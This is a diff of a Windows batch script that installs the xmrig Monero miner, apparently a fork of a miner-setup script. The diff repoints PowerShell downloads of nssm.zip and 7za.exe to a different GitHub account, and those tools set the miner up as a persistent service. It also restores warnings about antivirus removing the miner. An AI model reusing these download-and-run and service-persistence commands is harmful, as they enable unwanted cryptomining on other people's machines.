@@ -144,8 +144,8 @@ IF EXIST "%USERPROFILE%\xmrig" GOTO REMOVE_DIR0
 REM echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
 REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 REM if errorlevel 1 (
-  REM echo ERROR: Can't download MoneroOcean advanced version of xmrig
-  REM goto MINER_BAD
+REM echo ERROR: Can't download MoneroOcean advanced version of xmrig
+REM goto MINER_BAD
 REM )
 
 REM echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
@@ -217,11 +217,11 @@ powershell -Command "$out = cat '%USERPROFILE%\xmrig\config.json' | %%{$_ -repla
 "%USERPROFILE%\xmrig\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
-REM if exist "%USERPROFILE%\xmrig\xmrig.exe" (
-REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
-REM ) else (
-REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
-REM )
+if exist "%USERPROFILE%\xmrig\xmrig.exe" (
+echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
+ ) else (
+ echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
+)
 
 REM exit /b 1
 
@@ -295,7 +295,7 @@ goto OK
 :ADMIN_MINER_SETUP
 
 echo [*] Downloading tools to make miner service to "%USERPROFILE%\nssm.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make miner service
   exit /b 1
@@ -305,7 +305,7 @@ echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\xmrig')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
